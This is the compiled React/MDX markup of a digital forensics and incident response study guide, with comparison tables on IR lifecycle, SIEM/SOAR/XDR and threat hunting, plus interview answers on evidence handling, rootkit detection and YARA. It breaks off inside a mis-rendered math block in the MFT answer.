            children: "4-48 hours"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-3 days"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Anti-Forensics"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disk wiping, encryption, steganography"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Process hiding, DKOM, API hooking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Encryption (TLS), proxy chains, TOR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Factory reset, encryption, remote wipe"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "133-ir-lifecycle-crosswalk-nist-sp-800-61",
      children: "13.3 IR Lifecycle Crosswalk (NIST SP 800-61)"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Phase"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Activities"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Metrics"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Typical Duration"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Artifacts Produced"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Preparation"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CSIRT formation, tools, playbooks, training"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Time to deploy tools, tabletop frequency"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Ongoing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IR plan, playbooks, team roster, tool inventory"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Detection & Analysis"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Alert triage, log review, IOC matching, severity classification"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MTTD, alert volume, false positive rate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Minutes to hours (varies)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Incident ticket, initial findings, severity assessment"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Containment"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Network isolation, account disable, IP blocking, process kill"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MTTC, containment effectiveness"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "15 min to 4 hours"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Containment log, network change records"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Eradication"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Malware removal, patch application, credential rotation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Eradication success rate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-24 hours"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Eradication checklist, system scan results"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Recovery"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "System restore from backup, service restoration, monitoring"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MTTR, recovery completeness"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4-72 hours"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Restoration records, monitoring dashboards"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Post-Incident"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lessons learned, report writing, detection rule update"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Time to report, rule update count"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-5 days"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Incident report, lessons learned, updated playbooks"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "134-siem-vs-soar-vs-xdr-comparison",
      children: "13.4 SIEM vs SOAR vs XDR Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Dimension"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "SIEM (Splunk, ELK, Sentinel)"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "SOAR (XSOAR, Splunk SOAR)"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "XDR (CrowdStrike, SentinelOne)"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Core Function"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Log aggregation, correlation, alerting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automated response workflows"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Endpoint + network + cloud detection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Data Sources"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Any log source (firewall, server, app, cloud)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM alerts, ticketing, threat intel feeds"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Agent-based endpoints, network sensors"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Detection Method"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Rule-based, Sigma correlation, UEBA"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Playbook-driven decision trees"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ML behavioral, cross-vector correlation"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Response"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Manual (alerts analyst)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automated (playbook execution)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automated (isolation, containment)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Integration"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Integrates with almost everything"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Integrates with SIEM and tools"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vendor-specific ecosystem"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Deployment"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "On-prem or cloud"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud or hybrid"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud-managed (SaaS)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Best For"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compliance, centralized visibility"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Repeative triage, multi-tool orchestration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Endpoint protection, auto-containment"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Limitation"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Alert fatigue, high operational cost"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires playbook development"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Vendor lock-in, narrow data scope"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Typical Cost"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$$ (log volume pricing)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$ (per-playbook or per-action)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$$$$ (per-endpoint licensing)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Use Case Fit"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Compliance, reporting, threat hunting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SOC automation, IR playbooks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "EDR replacement, real-time response"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Maturity Requirement"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium (needs log source management)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (needs defined processes)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (turnkey deployment)"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "135-threat-hunting-methodology-comparison",
      children: "13.5 Threat Hunting Methodology Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Approach"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "When to Use"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Hypothesis-Driven"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Start with a hypothesis based on threat intel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Known TTPs from threat groups"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"Is APT29 using this technique in our environment?\""
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "IOC-Based"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Search for known indicators"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Immediately after threat intel update"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"Search for all systems contacting this C2 IP\""
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Analytics-Driven"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ML/statistical anomaly detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Large datasets, baseline deviation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"Unusual data transfer after business hours\""
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Situational Awareness"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Based on recent organizational changes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "New system deployment, M&A, policy changes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"New cloud deployment → are there misconfigurations?\""
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Intel-Driven"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "From threat intelligence reports"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "After high-profile vulnerability disclosure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "\"Is our Log4j patched → scan every system\""
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "14-interview-corner",
      children: "14. Interview Corner"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q1-what-is-the-order-of-volatility-and-why-is-it-important",
      children: "Q1: What is the order of volatility and why is it important?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " The Order of Volatility (OOV) is the sequence in which digital evidence must be collected, from most volatile to least volatile. It is based on the principle that the most volatile data (CPU registers, RAM) disappears fastest when a system is powered off, while the least volatile data (backups, archives) persists indefinitely. Collecting in the wrong order → for example, imaging the hard drive first → requires rebooting or running tools that will overwrite memory, destroying the most volatile evidence. The standard OOV is: (1) CPU registers/cache, (2) routing tables/ARP cache, (3) RAM/process memory, (4) temporary file systems, (5) disk storage, (6) removable media, (7) remote logs, (8) backups/archives, (9) physical documentation."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q2-what-are-the-key-differences-between-disk-forensics-and-memory-forensics",
      children: "Q2: What are the key differences between disk forensics and memory forensics?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " Disk forensics analyzes non-volatile storage (hard drives, SSDs) to recover files, deleted files, and metadata. It can recover evidence even after a system has been powered off. Memory forensics analyzes volatile RAM to capture running processes, active network connections, loaded DLLs, injected code, and encryption keys. Memory forensics is critical for detecting fileless malware that never touches disk, rootkits that hide from the OS, and live C2 communication. The key difference is scope: disk shows what was installed, memory shows what was running. Many sophisticated attacks leave no disk trace but are visible in memory."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q3-explain-chain-of-custody-and-what-happens-if-it-is-broken",
      children: "Q3: Explain chain of custody and what happens if it is broken."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " Chain of custody (CoC) is a formal chronological document that tracks every person who handles evidence, from collection to presentation in court. It includes: case identifier, item description, collection details, hash values, transfer log with signatures, storage conditions, and final disposition. If the CoC is broken → missing signatures, unexplained gaps in timeline, hash mismatches, unsecured storage → the evidence becomes legally inadmissible. The opposing counsel will file a motion to suppress, and the judge may exclude the evidence entirely. Even if no motion is filed, broken CoC destroys the jury's trust in the evidence's integrity. In civil cases, it can result in spoliation sanctions."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q4-how-do-you-detect-a-rootkit-during-memory-forensics",
      children: "Q4: How do you detect a rootkit during memory forensics?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " Rootkits are detected through several Volatility 3 plugins and techniques:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "pslist vs psscan"
        }), " → run both. Rootkits that DKOM-unlink from the process list appear in psscan (pool tag scanning) but not in pslist (active process list)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "modscan"
        }), " → finds hidden kernel modules not visible to ", (0,jsx_runtime.jsx)(_components.code, {
          children: "lsmod"
        }), "."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "ssdt"
        }), " → checks System Service Descriptor Table for hooks. Rootkits often hook system calls by modifying SSDT entries."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "driverscan"
        }), " → lists loaded drivers. Compare against known-good driver list."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "apihooks"
        }), " → checks for IAT and inline hooks in process memory."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "malfind"
        }), " → finds PAGE_EXECUTE_READWRITE memory regions (rootkit code injections)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "yarascan"
        }), " → scan for known rootkit signatures."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q5-what-is-file-carving-and-when-would-you-use-it",
      children: "Q5: What is file carving and when would you use it?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " File carving is the process of recovering files from raw disk data without using file system metadata, by matching file signatures (magic bytes). It is used when: (1) the file system is corrupted or formatted, (2) files have been deleted and their MFT/inode entries overwritten, (3) the disk has been intentionally wiped or partitioned, (4) extracting files from unallocated space, (5) recovering data from a damaged storage device. Carving tools like PhotoRec, Foremost, and Scalpel scan byte-by-byte for known file headers (JPEG: FF D8 FF, PDF: 25 50 44 46, ZIP: 50 4B 03 04) and extract everything between header and footer. Advanced carving can handle fragmented files, but success decreases with fragmentation level."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q6-what-are-the-four-phases-of-the-nist-incident-response-lifecycle",
      children: "Q6: What are the four phases of the NIST Incident Response lifecycle?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " The four phases are: (1) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Preparation"
      }), " → establishing CSIRT, tools, playbooks, and training before an incident occurs. This is the most important phase. (2) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection & Analysis"
      }), " → identifying that an incident is occurring through SIEM alerts, user reports, or threat intelligence, and analyzing the scope and severity. (3) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Containment, Eradication & Recovery"
      }), " → stopping the attack from spreading (containment), removing the threat from affected systems (eradication), and returning to normal operations (recovery). (4) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Post-Incident Activity"
      }), " → conducting lessons learned, writing the incident report, updating playbooks, and improving defenses. The lifecycle is iterative → lessons learned feed back into preparation."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q7-what-is-the-difference-between-mttd-mttr-and-mttc",
      children: "Q7: What is the difference between MTTD, MTTR, and MTTC?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " These are SOC performance metrics:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MTTD (Mean Time to Detect)"
        }), " → average time from the start of the incident to when it is detected. Target: <1 hour for critical incidents. Formula: Sum of detection times / number of incidents."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MTTR (Mean Time to Respond)"
        }), " → average time from detection to the start of response actions. Target: <15 minutes for critical incidents."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MTTC (Mean Time to Contain)"
        }), " → average time from detection to successful containment (stopping the incident from spreading). Target: <1 hour for active threats. These metrics are tracked to measure SOC effectiveness → improving all three reduces overall incident impact."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q8-how-would-you-investigate-a-potential-data-exfiltration-incident",
      children: "Q8: How would you investigate a potential data exfiltration incident?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " A data exfiltration investigation follows this methodology: (1) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Network analysis"
      }), " → Zeek/Wireshark analyze outbound connections: look for large data transfers, connections to unusual IPs/countries, FTP/SFTP traffic, encrypted tunnels. (2) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Endpoint analysis"
      }), " → check process creation logs (Event ID 4688) for compression tools (7z, WinRAR), upload scripts (PowerShell webclient), or DLP bypass tools. (3) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Volume analysis"
      }), " → compare baseline outbound traffic (from NetFlow/VPC Flow Logs) against current volumes. Look for >2 standard deviation increases. (4) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "File system analysis"
      }), " → check for staging directories (unusual .7z, .zip files, especially in temp or appdata). (5) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Cloud analysis"
      }), " → check CloudTrail for S3 bucket exports, database snapshots, or unusual data transfer API calls. (6) ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Timeline correlation"
      }), " → align data transfer events with user login times, off-hours access, and terminated employees."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q9-explain-how-yara-rules-work-and-give-an-example-of-when-you-would-write-one",
      children: "Q9: Explain how YARA rules work and give an example of when you would write one."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " YARA rules are pattern-matching rules used to identify and classify malware. A rule consists of: meta (author, description), strings (hex, text, or regex patterns), and condition (when the rule matches). Example scenario: You discover a new ransomware variant with the string \"LOCKBIT\" and a specific encryption function call. You write a YARA rule that matches files containing \"LOCKBIT\" AND the hex pattern of the encryption function. This rule is then deployed across your EDR to scan all endpoints for this specific ransomware. YARA is also used with Volatility (yarascan) to scan memory dumps and on file servers to scan uploaded files."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q10-what-is-the-difference-between-logical-and-physical-mobile-acquisition",
      children: "Q10: What is the difference between logical and physical mobile acquisition?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Logical acquisition"
      }), " uses the operating system's APIs to extract data. It retrieves what the OS allows: call logs, SMS, contacts, media files, and some app data. It does NOT capture deleted files or unallocated space. It works on locked devices (if USB debugging/trust is established) and does not require root/jailbreak. ", (0,jsx_runtime.jsx)(_components.strong, {
        children: "Physical acquisition"
      }), " creates a bit-for-bit copy of the device's flash memory. It recovers ALL data including deleted files, unallocated space, hidden partitions, and app remnants. It requires either a bootrom exploit (Checkm8 for older iOS devices), JTAG/SWD connections, or chip-off (physically removing the NAND chip). Physical acquisition recovers significantly more data but requires specialized hardware (Cellebrite, JTAG) and may void warranties. For modern encrypted devices (iOS 8+, Android 6+), physical acquisition may still be limited by hardware encryption."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q11-describe-a-time-when-the-chain-of-custody-was-crucial-in-a-digital-forensics-case",
      children: "Q11: Describe a time when the chain of custody was crucial in a digital forensics case."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " [Sample Answer] In a case involving employee theft of intellectual property, we captured a forensic image of the employee's laptop. The chain of custody documented: the seizure time (10:00 AM on Monday), the imaging process (dd with write-blocker, verified by SHA-256 hash), the individual who imaged it (Sarah Jones, CFCE), the storage location (safe #3 in the forensic lab), and every person who accessed it. When the employee sued for wrongful termination, the defense attempted to argue that evidence was planted. However, we produced the chain of custody form with timestamps matching our investigation timeline, hash values that matched across every verification, and sworn statements from every custodian. The judge admitted all evidence, and the case was settled. Had any link in the chain been missing → even a single signature → the evidence would likely have been suppressed."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "q12-what-is-the-significance-of-the-mft-in-ntfs-forensics",
      children: "Q12: What is the significance of the MFT in NTFS forensics?"
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " The Master File Table (", (0,jsx_runtime.jsxs)(_components.span, {
        className: "katex",
        children: [(0,jsx_runtime.jsx)(_components.span, {
          className: "katex-mathml",
          children: (0,jsx_runtime.jsx)(_components.math, {
            xmlns: "http://www.w3.org/1998/Math/MathML",
            children: (0,jsx_runtime.jsxs)(_components.semantics, {
              children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                children: [(0,jsx_runtime.jsx)(_components.mi, {
                  children: "M"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "F"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "T"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  stretchy: "false",
                  children: ")"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "h"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "h"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "N"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "T"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "F"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "S"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  children: "→"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "s"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "t"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "y"
                }), (0,jsx_runtime.jsx)(_components.mi, {
